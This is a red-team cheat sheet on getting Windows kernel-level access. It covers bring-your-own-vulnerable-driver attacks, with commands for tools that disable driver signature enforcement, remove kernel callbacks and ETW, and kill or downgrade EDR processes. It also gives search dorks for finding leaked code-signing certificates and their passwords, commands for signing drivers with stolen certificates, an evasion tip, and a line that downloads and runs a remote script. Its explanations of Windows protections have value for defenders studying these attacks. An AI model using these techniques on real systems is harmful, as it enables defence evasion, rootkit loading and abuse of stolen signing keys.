- [General](#General)
	- [Kernel Driver Development basics](#Kernel-Driver-Development)
- [Techniques to gain kernel privileges](#Techniques-to-gain-kernel-privileges)
	- [Kernel Driver protections](#Kernel-Driver-protections)
	- [Enumerate driver protections](#Enumerate-driver-protections)
	- [Driver signing by Windows Hardware Quality Labs](#Driver-signing-by-Windows-Hardware-Quality-Labs)
	- [Vulnerable drivers](#Vulnerable-drivers)
		- [Vulnerable Read/Write memory drivers](#Vulnerable-Read/Write-memory-drivers)
		- [Process killing drivers](#Process-killing-drivers)
	- [Downgrade attack](#Downgrade-attack)
	- [Leaked certificate](#Leaked-certificate)
	- [Test signing mode](#Test-signing-mode)
 - [Rootkit driver](#Rootkit-driver)

## General
### Kernel Driver Development
#### Lab setup
- Visual studio
	- C++ Workload
- Windows SDK and [Windows Driver Kit](https://learn.microsoft.com/nl-nl/windows-hardware/drivers/other-wdk-downloads)
	- Make sure the WDK and SDK versions match!
	- Make sure to select `Install Windows Driver Kit Visual Studio extension`
- Disable secure boot on the VM and Enable testsigning mode, then reboot machine 

```
bcdedit /set testsigning on
```

- Receive debug output. Run [DebugView](https://learn.microsoft.com/en-us/sysinternals/downloads/debugview) from Sysinternals as administrator
	- Add filter to filter for the `[DRIVERNAME]`

#### Create driver
- Create a new project with template `Empty WDM driver` 
- Delete the `.inf` file under `Driver Files` as its not needed for a minimal setup
- Add a new `.cpp` source file

#### Load driver
```
sc create <SERVICE NAME> type= kernel binPath="<PATH TO SYS FILE>"
sc start <SERVICE NAME>
```

- Via WIN32API
	- [OpenSCManagerA](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagera) - Opens a connection to the Service Control Manager
	- [CreateService](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea) - Register a new service
	- [StartService](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicea) - Start the service

#### Delete driver
```
sc stop <SERVICE NAME>
sc delete <SERVICE NAME>
```

- Via Win32API
	- [OpenService](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openservicea) - Retrieve a handle to existing service
	- [ControlService](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-controlservice) - Send control code to the service - Stop the service
	- [DeleteService](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-deleteservice) - Delete the service

#### Example Basic driver
- https://github.com/0xJs/FirstDriver
- SendDriver - Receives data from sendclient
	- [IoCreateDevice](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedevice) - Create device object
	- [IoCreateSymbolicLink](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatesymboliclink) - Create symbolic link for the client to communicate with
	- [IoGetCurrentIrpStackLocation](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iogetcurrentirpstacklocation) - Get a pointer to I/O stack location
	- Read the message from `Irp->AssociatedIrp.SystemBuffer`
	- [IofCompleteRequest](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocompleterequest) - Complete I/O operations
- SendClient - Sends data to driver
	- [CreateFileW](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew) - Open a handle to the driver using symbolic link
	- [DeviceIoControl](https://learn.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol) - Send control code to the driver
- GetDriver - Send data to getclient
	- [IoCreateDevice](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedevice) - Create device object
	- [IoCreateSymbolicLink](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatesymboliclink) - Create symbolic link for the client to communicate with
	- [IoGetCurrentIrpStackLocation](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iogetcurrentirpstacklocation) - Get a pointer to I/O stack location
	- [RtlCopyMemory](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemory) - Copy the message into Systembuffer to be send to user-mode
	- [IofCompleteRequest](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocompleterequest) - Complete I/O operations
- GetClient - Receives data from driver
	- [CreateFileW](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew) - Open a handle to the driver using symbolic link
	- [ReadFile](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile) - Read data from the driver

## Techniques to gain kernel privileges
- These techniques requires local administrator / system privileges.
- Most common techniques;
	- Sign your driver with a leaked certificate
	- If VBS and HVCI is disabled
		- Use a R/W Vulnerable driver to bypass DSE and load rootkit
	- If Secure boot is disabled
		- Enable Testsigning mode (Disables DSE)
		- Disable VBS/HVCI
	- Bring your own vulnerable, still valid, not blocked, driver
		- Use a R/W Vulnerable driver to read and write kernel memory, bypassing defenses
		- Use a `ZwTerminateProcess` IOCTL vulnerable driver to kill EDR processes

### Kernel Driver protections
- **Windows Hardware Quality Labs (WHQL)**
	- Since 2016, all third-party kernel-mode drivers must be submitted through WHQL to be signed by Microsoft. 
	- This process ensures drivers are validated for security and stability before being allowed on Windows.
	- WHQL signing is mandatory for drivers to be distributed through Windows Update and Microsoft Update Catalog.
	- Exception: Drivers signed before July 29, 2015 can still be loaded without re-submission, though Microsoft may block known-vulnerable ones.
	- Tools like HookSignTool have been used to re-sign drivers by hijacking legacy signatures, but this is considered a legacy bypass and may no longer be viable on modern systems (especially with HVCI or VBS enabled).
 - **Driver Signature Enforcement (DSE)**
	- A mandatory security feature since Windows Vista x64, ensuring that only signed kernel-mode drivers are loaded.
    - Enforced via the Code Integrity engine (`CI.dll`), which includes a global variable `g_CiOptions`:
	    - `0x6` – DSE Enabled (default)
	    - `0x0` – DSE Disabled
	    - `0xE` – Test Signing Mode (allows test-signed drivers)
	- Disabling DSE directly (via patching `g_CiOptions`) is protected by:
	    - PatchGuard (aka Kernel Patch Protection)
	    - HyperGuard (on supported hardware)
	    - Virtualization-Based Security (VBS) in modern Windows
	- Attempts to modify kernel memory (like `g_CiOptions`) from within drivers are blocked, making direct tampering extremely difficult or unstable.
- **Virtualization-Based Security (VBS)**
	- A platform-level security feature that uses hardware virtualization (e.g., Intel VT-x or AMD-V) to create isolated memory regions for sensitive OS components.
	- Enables features such as:
	    - Credential Guard (protects secrets like NTLM hashes and Kerberos tickets)
	    - Hypervisor-Enforced Code Integrity (HVCI)
	    - Secure Kernel Mode execution
	- When enabled, VBS isolates critical components from the rest of the OS, making kernel exploits significantly harder.
	- Many driver enforcement policies become significantly stricter when VBS is enabled.
	- Required for several enterprise-level protections and enabled by default on many newer Windows 11 systems.
	- Disabling VBS disables dependent features like HVCI and reduces overall kernel protection.
- **Hypervisor-Enforced Code Integrity (HVCI)**
	- Component of VBS that uses Hyper-V to isolate and protect kernel code integrity policies. Enabled by enabling memory integrity within Defender dashboard.
	- Prevents unsigned or improperly signed kernel-mode drivers from being loaded.
	- Requires drivers to be:
	    - Signed with EV certificates (WHQL program)
	    - HVCI-compatible (e.g., no legacy functions or unsupported calls)
	- Since Windows 11 (2022 Update), Microsoft enables the vulnerable driver blocklist by default across all devices. This blocklist:
	    - Is maintained by Microsoft and updated 1–2 times per year
	    - Blocks known vulnerable, signed drivers even if they are otherwise valid.
-  **Windows Defender Application Control (WDAC)**
	- A Windows security feature that defines what code is allowed to run, including drivers.
	- Can block both:
	    - Unsigned drivers
	    - Signed but vulnerable drivers (by using the Microsoft Recommended Driver Blocklist)
	- Enforced via:
	    - WDAC policies (enterprise-configurable)
	    - Smart App Control (consumer-focused, Windows 11)
	- WDAC may be stricter than HVCI because it allows organizations to enforce the most up-to-date blocklists, which may be newer than those bundled with HVCI.
- **Secure Boot**
	- A UEFI firmware-level security feature that ensures only trusted bootloaders and kernel-mode drivers are executed at startup.
	- Uses public key infrastructure (PKI) to validate the signatures of boot components (including early boot drivers).
	- Blocks boot-start unsigned or tampered drivers even before Windows fully loads.
	- Must be enabled in UEFI settings, and relies on OEM firmware trust chains (e.g., Microsoft’s keys)

### Enumerate driver protections
- Enumerates Signing mode, HVCI and VBS and some extra's
- https://github.com/0xJs/EnumMitigations/

```
.\EnumMitigations.exe
```

### Driver signing by Windows Hardware Quality Labs
- Microsoft accidentally signed several malware drivers
	- https://www.gdatasoftware.com/blog/microsoft-signed-a-malicious-netfilter-rootkit
	- https://www.bitdefender.com/en-us/blog/hotforsecurity/the-emergence-of-the-fivesys-rootkit-a-malicious-driver-signed-by-microsoft
- It is technically possible to have a driver signed by Microsoft WHQL by joining the program, which means even a vulnerable driver could obtain a valid signature. While unlikely, this could involve misuse that may fall into illegal activity.

### Vulnerable drivers
- Drivers have to be signed with a trusted certificate.
- Some drivers are vulnerable because their symbolic links are accessible to any user, allowing unprivileged processes to send IOCTL requests due to insecure use of `IoCreateDevice` when creating the driver interface.
- OPSEC: Rename the file and file extension to `.bin`, do not use `.sys`

#### Driver blocking
- There are multiple ways vulnerable drivers may be blocked;
	- Hypervisor-Enforced Code Integrity (HVCI) driver blacklist
		- Prevents kernel-mode drivers that are not signed by known-good certificates when HVCI (memory integrity) is turned on.
		- With Windows 11 2022 update, the vulnerable driver blocklist is enabled by default for all devices. It is updated with each new major release, typically 1-2 times per year.
	- Microsoft's Vulnerable Driver Blocklist
		- Prevents vulnerable signed drivers from being loaded. Its enabled via Windows Defender Application Control (WDAC) or Smart App Control (in Windows 11). The latest recommended [driver blocklist](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/microsoft-recommended-driver-block-rules#vulnerable-driver-blocklist-xml) can be found here.
	- Attack Surface Reduction rules
		- [Block abuse of exploited vulnerable signed drivers](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference#block-abuse-of-exploited-vulnerable-signed-drivers) - This rule prevents an application from writing a vulnerable signed driver to disk
	- EDR/AV may detect the vulnerable driver
- List of vulnerable drivers
	- https://loldb.xsec.fr/ (Better, uses data from loldrivers + extra information)
	- https://www.loldrivers.io/
	- https://byovd-watchdog.pwnfuzz.com/

### Identifying vulnerable drivers not yet blocked
- Check https://loldb.xsec.fr/
- https://github.com/ghostbyt3/BYOVDFinder

#### Extract driversipolicy.p7b to XML
- Extracts the driverspolicy applied to the machine
- [Link to script mattifestation policy parser](https://gist.githubusercontent.com/mattifestation/92e545bf1ee5b68eeb71d254cec2f78e/raw/a9b55d31075f91b467a8a37b9d8b2d84a0aa856b/CIPolicyParser.ps1)

```powershell
Iex (iwr https://gist.githubusercontent.com/mattifestation/92e545bf1ee5b68eeb71d254cec2f78e/raw/a9b55d31075f91b467a8a37b9d8b2d84a0aa856b/CIPolicyParser.ps1 -UseBasicParsing)
ConvertTo-CIPolicy -BinaryFilePath 'C:\Windows\System32\CodeIntegrity\driversipolicy.p7b' -XmlFilePath driversipolicy.xml
```

#### Or download the latest version of the XML
- Microsoft's vulnerable driver blocklist [XML](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/microsoft-recommended-driver-block-rules#vulnerable-driver-blocklist-xml).

#### Parse the policy
```
python finder.py driversipolicy.xml
```

### Changing the drivers filehash without corrupting the signing
- It is possible to change the filehash without corrupting the authentihash
	- Changing file hash will not work to bypass the driver blocklist.  It is based on cert signers, filename and versions and authentihashes
	- Works on bypassing file signature detections of EDR's
- https://github.com/med0x2e/SigFlip

```
.\SigFlip.exe -b "truesight.sys" "truesight-edited.sys"

Get-FileHash truesight.sys

Algorithm       Hash                                                            
---------       ----                                                             
SHA256          BFC2EF3B404294FE2FA05A8B71C7F786B58519175B7202A69FE30F45E607FF1C

Get-FileHash truesight-edited.sys

Algorithm       Hash                                                             
---------       ----                                                            
SHA256          CD56F9C9FC0D83BF372A6EC356E728F555FE180543A661F809D1372F4FA45903
```

### Finding vulnerable drivers
- Good and better source on how to do this: https://github.com/BlackSnufkin/BYOVD/tree/main
- https://alice.climent-pommeret.red/posts/process-killer-driver/

#### Finding vulnerable functions
- Used for killing processes such as EDR their processes
- Open the driver and look for `ZwTerminateProcess` or `NtTerminateProcess` imported from `ntoskrnl.exe` calls using [CFF Explorer](https://ntcore.com/explorer-suite/), [PE Bear](https://github.com/hasherezade/pe-bear), IDA or the below python script which parses the imports

#### Finding vulnerable driver python script
```python
import os
import sys
import pefile

def check_driver_imports(folder_path):
    # ANSI escape codes for colors
    RED = '\033[91m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

    # Check each file in the specified directory
    for filename in os.listdir(folder_path):
        filepath = os.path.join(folder_path, filename)
        if os.path.isfile(filepath):
            try:
                pe = pefile.PE(filepath)
                has_zwterminateprocess = False

                # Check if the PE file imports from ntoskrnl.exe
                for entry in pe.DIRECTORY_ENTRY_IMPORT:
                    if entry.dll.decode().lower() == 'ntoskrnl.exe':
                        # Check each imported function
                        for function in entry.imports:
                            if function.name is not None:
                                if function.name.decode() == 'ZwTerminateProcess':
                                    has_zwterminateprocess = True

                if has_zwterminateprocess:
                    print(f"{RED}{filename} imports ZwTerminateProcess from ntoskrnl.exe{RESET}")
                else:
                    print(f"{WHITE}{filename} does not import ZwTerminateProcess from ntoskrnl.exe{RESET}")

            except Exception as e:
                pass

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <path_to_folder>")
        sys.exit(1)
    folder_path = sys.argv[1]
    check_driver_imports(folder_path)
```

#### Reversing
- Open the driver in a reversing tool such as IDA pro and search & click on the `ZwTerminateProcess` or `NtTerminateProcess` from the imports tabs
- Use cross reference on the API call. (Press `x` in IDA)
- Select the function and then press F5 to decompile it
- Keep using cross reference on callers until `DeviceIoControl` major function that exposes `IOCTL` code and `systemBuffer` that is holding the PID of the process to kill.
- Use cross reference again to get into `DriverEntry` to lookup for the device name

### Vulnerable Read/Write memory drivers
- Also called the "What Where" vulnerability
- Exploitation concepts;
	- Changing Process Protection Levels
	    - Disable Runasppl LSASS protection
	- Removing Kernel Callbacks
	- Disabling ETW providers
	- Change process token
	    - Privilege escalation to system
	    - Downgrade EDR's token
	- Disable DSE in case VBS is disabled and load unsigned driver

#### DSE Remover
- Disables DSE and loads unsigned rootkit driver
- https://github.com/0xJs/BYOVD_read_write_primitive

```powershell
.\DSERemover.exe
```

#### Protection Changer
- Changes the protection level of a process by reading and writing inside kernel memory
- https://github.com/0xJs/BYOVD_read_write_primitive

```
.\ProtectionChanger.exe -p <PID> -v <NEW PROTECTION LEVEL>
```

#### Kernel callback remover
- Disables all kernel callbacks by reading and writing inside kernel memory
- https://github.com/0xJs/BYOVD_read_write_primitive

```
.\KernelCallbackRemover.exe -d
```

#### ETwTi remover
- Disables the ETwTi provider by reading and writing inside kernel memory
- https://github.com/0xJs/BYOVD_read_write_primitive

```
.\ETwTiRemover.exe -d
```

#### Token Changer - Downgrade EDR
- Changes/steals the token of the process by reading and writing inside kernel memory
- https://github.com/0xJs/BYOVD_read_write_primitive

```
.\TokenChanger.exe --tp <TARGET PID> --SP <SOURCE PID>
.\TokenChanger.exe --EDR --SP <SOURCE PID>
```

### Process killing drivers
- Using `ZwOpenProcess` to open handle and `ZwTerminateProcess` for terminating processes
- Mostly a security driver (Anti-malware or Anti-Rootkit)
- Examples:
	- Adlice - https://www.loldrivers.io/drivers/e0e93453-1007-4799-ad02-9b461b7e0398/
	- PC Tools - https://www.loldrivers.io/drivers/bd9f084e-b235-4978-bf2a-5f1dc02937df/
	- Virag - https://www.loldrivers.io/drivers/7edb5602-239f-460a-89d6-363ff1059765/
	- Wsftprm - https://www.loldrivers.io/drivers/30e8d598-2c60-49e4-953b-a6f620da1371/

#### Example Wsftprm driver
- Disable's EDR process by killing it within a loop
- https://github.com/0xJs/BYOVD_EDRKiller/tree/main

```
.\EDRKiller_Wsftprm.exe
```

Manual cleanup

```
sc stop wsftprm
sc delete wsftprm
del C:\Windows\System32\Drivers\wsftprm.sys
```

### Downgrade attack
- Patched for Windows 11 23H2 as [KB5037771](https://support.microsoft.com/en-us/topic/may-14-2024-kb5037771-os-builds-22621-3593-and-22631-3593-e633ff2f-a021-4abb-bd2e-7f3687f166fe) [Source](https://www.elastic.co/security-labs/false-file-immutability) but bypasses DSE.
- Bring your own vulnerable version. Downgrade update/secure files/software/components to old/vulnerable ones
- Project which automates this; https://github.com/SafeBreach-Labs/WindowsDowndate
- Requirements;
	- Restart of the Windows machine

#### WindowsDowndate
- Tool to downgrade WindowsUpdate critical files
- https://github.com/SafeBreach-Labs/WindowsDowndate/tree/main/examples/ItsNotASecurityBoundary-Patch-Downgrade
- Overwrites `securekernel.exe`, `ci.dll` and `ci.dll.mui`
- Create Executable

```
pip install -U pyinstaller
pyinstaller --onefile .\windows_downdate.py
cp .\dist\windows_downdate.exe .
```

```
python .\windows_downdate.py 

.\windows_downdate.exe --config-xml <CONFIG .XML>
```

#### ItsNotASecurityBoundary
- DSE Bypass by patching memory, loads an unsigned driver
- https://github.com/gabriellandau/ItsNotASecurityBoundary

```
.\ItsNotASecurityBoundary.exe <DRIVER.SYS>
```

### Leaked certificate
- The dark web is one of the main platforms for selling codesigning certificates, including Extended Validation (EV) certificates to sign critical code such as Windows drivers
- Certificates from Nvidia, Frostburn studios and Comodo have been leaked and abused.

### Finding leaked certificates
#### Gamehacking forums
- https://unknowncheats.me
- https://www.unknowncheats.me/forum/anti-cheat-bypass/587763-sign-kernel-driver-leaked-certificate.html

#### Google dorks
```
# Certificates
intitle:"index of" (pfx | p12) or intitle:"index of" "backup" (pfx | p12)

# Password files
intitle:"index of" (pfx | p12) (password | credentials) (txt | doc | docx
| pdf) 
intitle:"index of" (pfx | p12) (txt | doc | docx | pdf)
```

#### Github dorks
```
# Signtool repositories
https://github.com/search?q=signtool&type=code

# PFX or P12 files
https://github.com/search?q=signtool+extension%3Apfx&type=code
https://github.com/search?q=signtool+extension%3Ap12&type=code

# Hardcoded passowrds in signtool command line
https://github.com/search?q=signtool+%2Fp&type=code
```

#### Misc
- Search for public PFX and P12 files in Public cloud storage such as S3 buckets and
	- https://buckets.grayhatwarfare.com/
- Search Engines Specific code repositories;
	- https://sourcegraph.com/

```
Searchcode: "signtool" "/p" "password"
Sourcegraph: (pfx OR p12) AND (signtool /p OR signtool.exe /p)
```

### Sign with stolen certificate
#### Signtool
- From the [Windows SDK](https://learn.microsoft.com/en-us/windows/win32/seccrypto/signtool)
- Add signtool `C:\Program Files (x86)\Windows Kits\10\bin\10.0.26100.0\x64` to the PATH
- Set the system time and date to something like 20 June 2015
- Does not work for expired certificates as its expired and the API's won't be hooked as in SigntoolEx or DSigntool

```
signtool.exe sign /v /ac <PATH TO CRT FILE> /f <PATH TO PFX> /p <PASSWORD> /t "http://timestamp.digicert.com/" /fd SHA256 <PROGRAM TO SIGN>
```

#### SigntoolEx
- [https://github.com/hackerhouse-opensource/SignToolEx](https://github.com/hackerhouse-opensource/SignToolEx "https://github.com/hackerhouse-opensource/SignToolEx")
- Add signtool `C:\Program Files (x86)\Windows Kits\10\bin\10.0.26100.0\x64` to the PATH

```
SignToolEx.exe sign /v /f <PATH TO PFX> /p <PASSWORD> /fd SHA256 <PROGRAM TO SIGN>
```

#### DSigntool
- https://www.unknowncheats.me/forum/anti-cheat-bypass/587763-sign-kernel-driver-leaked-certificate.html
- This worked to sign a unsigned driver and then sign and load it on Windows server 2022! Doesn't work on latest W11!
- Had some problems loading the Henan cert but it worked eventually

### Test signing mode
- Requirements;
	- Secure boot to be disabled
	- Restart of the Windows machine
- Enabled testsigning mode will permit test-signed drivers with DSE, then loading unsigned drivers is possible.

#### Enable testsigning mode
```
bcdedit /set testsigning on
```

#### Disable testsigning mode
```
bcdedit /set testsigning off
```

## Rootkit driver
- Useful when DSE is disabled, test signing is enabled or when you have a leaked certificate
- https://github.com/Idov31/Nidhogg